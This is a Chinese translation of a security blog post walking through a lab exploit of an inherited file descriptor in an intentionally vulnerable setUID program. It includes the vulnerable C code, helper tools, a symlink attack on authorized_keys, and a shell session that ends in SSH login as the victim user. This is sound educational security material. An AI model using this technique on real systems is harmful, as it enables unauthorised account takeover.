> 原文链接: https://www.anquanke.com//post/id/150109 


# setUID程序中的继承文件句柄利用


                                阅读量   
                                **85626**
                            
                        |
                        
                                                                                                                                    ![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)
                                                                                            



##### 译文声明

本文是翻译文章，文章原作者，文章来源：labs.portcullis.co.uk
                                <br>原文地址：[https://labs.portcullis.co.uk/blog/exploiting-inherited-file-handles-in-setuid-programs/](https://labs.portcullis.co.uk/blog/exploiting-inherited-file-handles-in-setuid-programs/)

译文仅供参考，具体内容表达以及含义原文为准

[![](https://p1.ssl.qhimg.com/t0123572a4c8e05a4df.jpg)](https://p1.ssl.qhimg.com/t0123572a4c8e05a4df.jpg)

## 前言

在这篇文章中，我们将研究渗透和安全工作者在setUID程序中发现的许多安全问题之一。对于子进程来说，继承父进程中打开的文件句柄是相当常见的(虽然有避免这种情况的方法)。在某些情况下，这可能会出现安全缺陷。这就是我们将在Linux上的setUID程序的环境中看到的内容。

最近我在处理一个黑客挑战题时想起了这个技术，还有一个比使用我将在这里介绍的技术简单得多的解决方案。大家也许可以尝试两种方法：一种是比较难的方式，另一种是简单的。



## 示例程序

下面是一个非常简短的示例代码测试用例-参考了nebula challenge的代码。

```
#include &lt;stdlib.h&gt;
#include &lt;unistd.h&gt;
#include &lt;string.h&gt;
#include &lt;fcntl.h&gt;
#include &lt;stdio.h&gt;

int main(int argc, char **argv)
`{`
 char *cmd = argv[1];
 char tmpfilepath[] = "/tmp/tmpfile";  // Modern systems need "sysctl fs.protected_symlinks=0" or "chmod 0777 /tmp" for this to be vulnerable to the symlink attack we'll use later.
 char data[] = "pointless datan";

int fd = open(tmpfilepath, O_CREAT|O_RDWR, 0600);
 unlink(tmpfilepath);
 write(fd, data, strlen(data));
 setuid(getuid());
 system(cmd);
`}`
```

让我们从编译这个代码开始，并设置setUID，完成初始准备：

```
root@challenge:/# useradd -m tom # victim/target user
root@challenge:/# useradd -m bob # attacker
root@challenge:/# cd ~bob
root@challenge:/home/bob# cp /share/fd-leak.c .
root@challenge:/home/bob# gcc -o fd-leak fd-leak.c
root@challenge:/home/bob# chown tom:tom fd-leak
root@challenge:/home/bob# chmod 4755 fd-leak
root@challenge:/home/bob# ls -l fd-leak
-rwsr-xr-x 1 root root 8624 Apr 12 11:06 fd-leak
root@challenge:/home/bob# su - bob
bob@challenge:~$ ./fd-leak id
uid=1001(bob) gid=1001(bob) groups=1001(bob)
```

为了接下来的利用，我们还需要目标用户(在本例中是tom)在主目录中有一个.ssh文件夹：

```
root@challenge:/# mkdir ~tom/.ssh; chown tom:tom ~tom/.ssh
```

这个程序在实际使用方面存在不足但贵在简单。



## 正常操作

从上面的代码可以看出，程序将：
1. 创建/tmp/tmpfile文件，然后删除它。保留文件描述符。
1. 取消权限。这段用于取消权限有些糟糕，不过对于这个例子来说足够了。
1. 运行作为参数提供的命令。它应该作为调用用户运行，而不是作为目标用户(Tom)运行。
让我们试一下(注意，为了在生成shell子进程时使读者更清楚地了解它，我修改了.bashrc)：

```
root@challenge:/home/bob# su - bob
bob@challenge:~$ ./fd-leak id
uid=1001(bob) gid=1001(bob) groups=1001(bob)
bob@challenge:~$ echo 'echo subshell...' &gt; .bashrc
bob@challenge:~$ ./fd-leak id
uid=1001(bob) gid=1001(bob) groups=1001(bob)
bob@challenge:~$ ./fd-leak bash -p
subshell...
bob@challenge:~$ id
uid=1001(bob) gid=1001(bob) groups=1001(bob)
root@challenge:/home/bob# useradd -m tom
root@challenge:/home/bob# su - tom
$ mkdir .ssh
$ ls -la
total 28
drwxr-xr-x 3 tom tom 4096 Apr 12 11:42 .
drwxr-xr-x 2 tom tom 4096 Apr 12 11:42 .ssh
...
```

所以，fd-leak似乎取消了权限。(我们生成的shell并不对权限负责，我希望通过将-p传递到bash上面并直接运行id能说明这一点)。

最后，我们期望子进程继承/tmp/tmpfile的文件句柄：

```
bob@challenge:~$ ls -l /proc/self/fd
total 0
lrwx------ 1 bob bob 64 Apr 12 11:22 0 -&gt; /dev/pts/2
lrwx------ 1 bob bob 64 Apr 12 11:22 1 -&gt; /dev/pts/2
lrwx------ 1 bob bob 64 Apr 12 11:22 2 -&gt; /dev/pts/2
lrwx------ 1 bob bob 64 Apr 12 11:22 3 -&gt; '/tmp/tmpfile (deleted)'
lr-x------ 1 bob bob 64 Apr 12 11:22 4 -&gt; /proc/53982/fd
```

可以看到，的确是这样的。



## 更高级的方法

我们攻击这个程序的方法将遵循这些高级步骤，这些步骤将在下面几节中更详细地介绍：
1. 创建一个符号链接（symlink），代码将尝试写入该符号链接。这样，我们可以在我们选择的位置创建一个文件，并使用我们选择的名称。我们将选择~tom/.ssh/authorized_keys
1. 我们将在子进程的环境中运行一些代码来操作打开的文件句柄，这样就可以编写authorized_keys文件的内容。
1. 最后通过SSH登录。


## 实际开发

### <a class="reference-link" name="%E6%AD%A5%E9%AA%A41%EF%BC%9A%E7%AC%A6%E5%8F%B7%E9%93%BE%E6%8E%A5%EF%BC%88symlink%EF%BC%89%E6%94%BB%E5%87%BB"></a>步骤1：符号链接（symlink）攻击

简单的:

```
ln -s ~tom/.ssh/authorized_keys /tmp/tmpfile
```

这一步在nebula挑战中更加困难，但我不想把问题弄混。

如果我们现在运行代码，我们会看到已创建authorized_keys文件，但我们不控制内容。

```
bob@challenge:~$ ls -l ~tom/.ssh/authorized_keys
-rw------- 1 tom bob 15 Apr 12 12:12 /home/tom/.ssh/authorized_keys
bob@challenge:~$ ln -s ~tom/.ssh/authorized_keys /tmp/tmpfile
ln: failed to create symbolic link '/tmp/tmpfile': File exists
bob@challenge:~$ ls -l /tmp/tmpfile
lrwxrwxrwx 1 bob bob 30 Apr 12 12:11 /tmp/tmpfile -&gt; /home/tom/.ssh/authorized_keys
bob@challenge:~$ ./fd-leak id
uid=1001(bob) gid=1001(bob) groups=1001(bob)
bob@challenge:~$ ls -l ~tom/.ssh/authorized_keys
-rw------- 1 tom bob 15 Apr 12 12:12 /home/tom/.ssh/authorized_keys
```

我们也不控制创建文件的权限。(在运行“umask 0”以进行检查之后，可以在authorized_keys2上尝试上面的操作)。

### <a class="reference-link" name="%E6%AD%A5%E9%AA%A42%EF%BC%9A%E5%9C%A8%E5%AD%90%E8%BF%9B%E7%A8%8B%E4%B8%AD%E8%BF%90%E8%A1%8C%E4%BB%A3%E7%A0%81"></a>步骤2：在子进程中运行代码

运行代码很容易。再次说明，这在星云挑战中更加困难。我们可以看到我们希望在/proc/self/fd中列出的文件句柄。文件描述符3：

```
bob@challenge:~$ ln -s ~tom/.ssh/authorized_keys /tmp/tmpfile

bob@challenge:~$ ls -l /tmp/tmpfile
lrwxrwxrwx 1 bob bob 30 Apr 12 12:25 /tmp/tmpfile -&gt; /home/tom/.ssh/authorized_keys
bob@challenge:~$ ./fd-leak bash
subshell...
bob@challenge:~$ ls -l /proc/self/fd
total 0
lrwx------ 1 bob bob 64 Apr 12 12:26 0 -&gt; /dev/pts/1
lrwx------ 1 bob bob 64 Apr 12 12:26 1 -&gt; /dev/pts/1
lrwx------ 1 bob bob 64 Apr 12 12:26 2 -&gt; /dev/pts/1
lrwx------ 1 bob bob 64 Apr 12 12:26 3 -&gt; /home/tom/.ssh/authorized_keys
lr-x------ 1 bob bob 64 Apr 12 12:26 4 -&gt; /proc/54947/fd
```

所以我们只能“echo key &gt; /proc/self/fd/3”？不是，那只是个符号链接，一个指向不存在的文件的符号链接。它指向的是一个我们没有权限创建文件的地方。让我们确认一下？

```
bob@challenge:~$ ls -l /home/tom/.ssh/authorized_keys
-rw------- 1 tom bob 15 Apr 12 12:25 /home/tom/.ssh/authorized_keys
bob@challenge:~$ id
uid=1001(bob) gid=1001(bob) groups=1001(bob)
bob@challenge:~$ echo &gt; /home/tom/.ssh/authorized_keys
bash: /home/tom/.ssh/authorized_keys: Permission denied
bob@challenge:~$ echo &gt; /tmp/tmpfile
bash: /tmp/tmpfile: Permission denied
bob@challenge:~$ echo &gt; /proc/self/fd/3
bash: /proc/self/fd/3: Permission denied
```

我们需要写入文件描述符3…那么，是否有CAT版本支持文件描述符呢？就我所知没有，让我们编写一些小实用程序来帮助我们掌握对继承文件句柄的访问。我们将编写3个工具：
- read-使用读函数从特定的文件描述符读取一组字节数。
- write-将我们选择的字符串写入特定的文件描述符。
- lseek-这样我们就可以知道读/写的位置
下面是(非常简单的)演示的代码：

```
bob@challenge:~$ cat read.c
#include &lt;unistd.h&gt;
#include &lt;stdio.h&gt;
#include &lt;stdlib.h&gt;
#include &lt;string.h&gt;

int main(int argc, char *argv[]) `{`
 char buf[1024];
 memset(buf, 0, 1024);
 int r = read(atoi(argv[1]), buf, 10);
 printf("Read %d bytesn", r);
 write(1, buf, 10);
`}`

bob@challenge:~$ gcc -o read read.c
bob@challenge:~$ cat write.c
#include &lt;unistd.h&gt;
#include &lt;stdio.h&gt;
#include &lt;stdlib.h&gt;
#include &lt;string.h&gt;

int main(int argc, char *argv[]) `{`
 printf("writing %s to fd %sn", argv[2], argv[1]);
 write(atoi(argv[1]), argv[2], strlen(argv[2]));
`}`
bob@challenge:~$ gcc -o write write.c
bob@challenge:~$ cat lseek.c
#include &lt;sys/types.h&gt;
#include &lt;unistd.h&gt;
#include &lt;stdio.h&gt;
#include &lt;stdlib.h&gt;
#include &lt;string.h&gt;

int main(int argc, char *argv[]) `{`
 printf("seek to position %s on fd %sn", argv[2], argv[1]);
 lseek(atoi(argv[1]), atoi(argv[2]), SEEK_SET);
`}`

bob@challenge:~$ gcc -o lseek lseek.c
```

先看看这些工具的作用。首先，我们尝试读取，然后写入文件描述符3，但是读取总是返回0字节：

```
bob@challenge:~$ ./read 3
Read 0 bytes
bob@challenge:~$ ./write 3 hello
writing hello to fd 3
bob@challenge:~$ ./read 3
Read 0 bytes
```

原因是我们需要在文件中查找一个不是文件末尾的位置。让我们查找位置0，即文件的开头：

```
bob@challenge:~$ ./lseek 3 0
seek to position 0 on fd 3
bob@challenge:~$ ./read 3
Read 10 bytes
pointless bob@challenge:~$ ./read 3
Read 10 bytes
data
hellobob@challenge:~$ ./read 3
Read 0 bytes
```

现在好多了。

最后，我们需要利用上述程序。我们有两个选择：
- 像以前一样运行shell，然后使用我们的新工具将密钥写入授权键；或者，
- 使用上面的函数来编写一个新的工具来写入授权的键。
我们选择前者。大家可以试试后者作为练习。请注意，在写入数据之前，我们需要寻找位置0。重要的一点是要覆盖已经存在的“pointless”消息，因为它破坏了authorized_keys文件：

```
bob@challenge:~$ ssh-keygen
Generating public/private rsa key pair.
Enter file in which to save the key (/home/bob/.ssh/id_rsa): bobkey
Enter passphrase (empty for no passphrase):
Enter same passphrase again:
Your identification has been saved in bobkey.
Your public key has been saved in bobkey.pub.
bob@challenge:~$ cat bobkey.pub
ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC2PezJjFSI778OvONA5aqfM2Y2d0eYizOkcqTimy7dXfaEhSKnRSRyfwOfwOOaVpLdZW9NmfaPd5G8RY3n+3QwDIPv4Aw5oV+5Q3C3FRG0oZoe0NqvcDN8NeXZFbzvcWqrnckKDmm4gPMzV1rxMaRfFpwjhedyai9iw5GtFOshGZyCHBroJTH5KQDO9mow8ZxFKzgt5XwrfMzvBd+Mf7kE/QtD40CeoNP+GsvNZESxMC3pWfjZet0p7Jl1PpW9zAdN7zaQPH2l+GHzvgPuZDgn+zLJ4CB69kGkibEeu1c1T80dqDDL1DkN1+Kbmop9/5gzOYsEmvlA4DQC6nO9NCTb bob@challenge
bob@challenge:~$ ls -l bobkey.pub
-rw-r--r-- 1 bob bob 387 Apr 12 12:30 bobkey.pub
bob@challenge:~$ ./lseek 3 0
seek to position 0 on fd 3
bob@challenge:~$ ./write 3 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC2PezJjFSI778OvONA5aqfM2Y2d0eYizOkcqTimy7dXfaEhSKnRSRyfwOfwOOaVpLdZW9NmfaPd5G8RY3n+3QwDIPv4Aw5oV+5Q3C3FRG0oZoe0NqvcDN8NeXZFbzvcWqrnckKDmm4gPMzV1rxMaRfFpwjhedyai9iw5GtFOshGZyCHBroJTH5KQDO9mow8ZxFKzgt5XwrfMzvBd+Mf7kE/QtD40CeoNP+GsvNZESxMC3pWfjZet0p7Jl1PpW9zAdN7zaQPH2l+GHzvgPuZDgn+zLJ4CB69kGkibEeu1c1T80dqDDL1DkN1+Kbmop9/5gzOYsEmvlA4DQC6nO9NCTb bob@challenge'
 writing ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC2PezJjFSI778OvONA5aqfM2Y2d0eYizOkcqTimy7dXfaEhSKnRSRyfwOfwOOaVpLdZW9NmfaPd5G8RY3n+3QwDIPv4Aw5oV+5Q3C3FRG0oZoe0NqvcDN8NeXZFbzvcWqrnckKDmm4gPMzV1rxMaRfFpwjhedyai9iw5GtFOshGZyCHBroJTH5KQDO9mow8ZxFKzgt5XwrfMzvBd+Mf7kE/QtD40CeoNP+GsvNZESxMC3pWfjZet0p7Jl1PpW9zAdN7zaQPH2l+GHzvgPuZDgn+zLJ4CB69kGkibEeu1c1T80dqDDL1DkN1+Kbmop9/5gzOYsEmvlA4DQC6nO9NCTb bob@challenge to fd 3
```

### <a class="reference-link" name="%E6%AD%A5%E9%AA%A43%EF%BC%9A%E9%80%9A%E8%BF%87SSH%E7%99%BB%E5%BD%95"></a>步骤3：通过SSH登录

```
bob@challenge:~$ ssh -i bobkey tom@localhost
$ id
uid=1002(tom) gid=1002(tom) groups=1002(tom)
```

我们完成了。我们利用泄露的文件描述符将我们选择的数据写入目标用户（在本例是tom）的authorized_keys文件。在这个过程中，我们使用了一种有点不切实际的符号链接攻击，但这并不会使我们关于如何使用和滥用泄漏的文件描述符的讨论无效。



## 结论

黑客挑战很有趣。即使是你不小心找到了一个更难的解决方案，并且浪费的时间比需要的长10倍。

编写安全的setUID程序可能很困难，特别是在生成子进程时，或者在其他用户可写的目录中使用open()时。 users. fs.protected_symlinks为设置了粘滞位(sticky bit)的文件夹提供了一些缓解措施。

审核人：yiwang   编辑：边边
